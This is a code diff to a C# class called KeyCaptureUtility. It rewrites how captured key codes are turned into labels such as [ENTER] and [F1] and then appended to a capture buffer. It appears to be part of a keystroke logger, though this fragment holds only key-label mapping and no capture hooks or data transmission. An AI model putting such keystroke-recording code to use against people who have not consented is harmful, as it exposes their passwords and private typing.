@@ -125,84 +125,37 @@ public class KeyCaptureUtility
                         {
                             string charPressed = logChar.ToString();
 
-                            // Handle special keys like Backspace, Enter, Escape, Shift, Alt, and other common keys
-                            switch (asc)
-                            {
-                                case 8:
-                                    charPressed = "[BKSP]";        // Backspace
-                                    break;
-                                case 13:
-                                    charPressed = "[ENTER]";       // Enter
-                                    break;
-                                case 27:
-                                    charPressed = "[ESC]";         // Escape
-                                    break;
-                                case 16:
-                                    charPressed = "[SHIFT]";       // Shift
-                                    break;
-                                case 17:
-                                    charPressed = "[CTRL]";        // Control (Ctrl)
-                                    break;
-                                case 18:
-                                    charPressed = "[ALT]";         // Alt
-                                    break;
-                                case 91:
-                                case 92:
-                                    charPressed = "[CMD]";         // Command (or Windows) key
-                                    break;
-                                case 32:
-                                    charPressed = "[SPACE]";       // Spacebar
-                                    break;
-                                case 9:
-                                    charPressed = "[TAB]";         // Tab
-                                    break;
-                                case 20:
-                                    charPressed = "[CAPSLOCK]";    // CapsLock
-                                    break;
-                                case 33:
-                                    charPressed = "[PAGEUP]";      // Page Up
-                                    break;
-                                case 34:
-                                    charPressed = "[PAGEDOWN]";    // Page Down
-                                    break;
-                                case 35:
-                                    charPressed = "[END]";         // End
-                                    break;
-                                case 36:
-                                    charPressed = "[HOME]";        // Home
-                                    break;
-                                case 37:
-                                    charPressed = "[LEFTARROW]";   // Left Arrow
-                                    break;
-                                case 38:
-                                    charPressed = "[UPARROW]";     // Up Arrow
-                                    break;
-                                case 39:
-                                    charPressed = "[RIGHTARROW]";  // Right Arrow
-                                    break;
-                                case 40:
-                                    charPressed = "[DOWNARROW]";   // Down Arrow
-                                    break;
-                                case 44:
-                                    charPressed = "[PRINTSCREEN]"; // Print Screen
-                                    break;
-                                case 45:
-                                    charPressed = "[INSERT]";      // Insert
-                                    break;
-                                case 46:
-                                    charPressed = "[DELETE]";      // Delete
-                                    break;
-                                case 144:
-                                    charPressed = "[NUMLOCK]";     // Num Lock
-                                    break;
-                                case 145:
-                                    charPressed = "[SCROLLLOCK]";  // Scroll Lock
-                                    break;
-                                default:
-                                    // For all other keys, we translate normally
-                                    captureBuffer.Append(charPressed);
-                                    break;
-                            }
+                            // Handle special keys like Backspace, Enter, and Escape
+                            if (asc == 8) charPressed = "[BKSP]";  // Backspace
+                            if (asc == 13) charPressed = "[ENTER]";  // Enter
+                            if (asc == 27) charPressed = "[ESC]";  // Escape
+                            if (asc == 9) charPressed = "[TAB]";  // Tab
+                            if (asc == 32) charPressed = "[SPACE]";  // Space bar
+                            if (asc == 46) charPressed = "[DEL]";  // Delete
+                            if (asc == 37) charPressed = "[LEFT]";  // Left Arrow
+                            if (asc == 38) charPressed = "[UP]";  // Up Arrow
+                            if (asc == 39) charPressed = "[RIGHT]";  // Right Arrow
+                            if (asc == 40) charPressed = "[DOWN]";  // Down Arrow
+                            if (asc == 33) charPressed = "[PGUP]";  // Page Up
+                            if (asc == 34) charPressed = "[PGDN]";  // Page Down
+                            if (asc == 35) charPressed = "[END]";  // End
+                            if (asc == 36) charPressed = "[HOME]";  // Home
+                            if (asc == 144) charPressed = "[NUMLOCK]";  // Num Lock
+                            if (asc == 145) charPressed = "[SCROLLLOCK]";  // Scroll Lock
+                            if (asc == 112) charPressed = "[F1]";  // F1
+                            if (asc == 113) charPressed = "[F2]";  // F2
+                            if (asc == 114) charPressed = "[F3]";  // F3
+                            if (asc == 115) charPressed = "[F4]";  // F4
+                            if (asc == 116) charPressed = "[F5]";  // F5
+                            if (asc == 117) charPressed = "[F6]";  // F6
+                            if (asc == 118) charPressed = "[F7]";  // F7
+                            if (asc == 119) charPressed = "[F8]";  // F8
+                            if (asc == 120) charPressed = "[F9]";  // F9
+                            if (asc == 121) charPressed = "[F10]";  // F10
+                            if (asc == 122) charPressed = "[F11]";  // F11
+                            if (asc == 123) charPressed = "[F12]";  // F12
+
+                            captureBuffer.Append(charPressed);
                         }
                     }
                 }
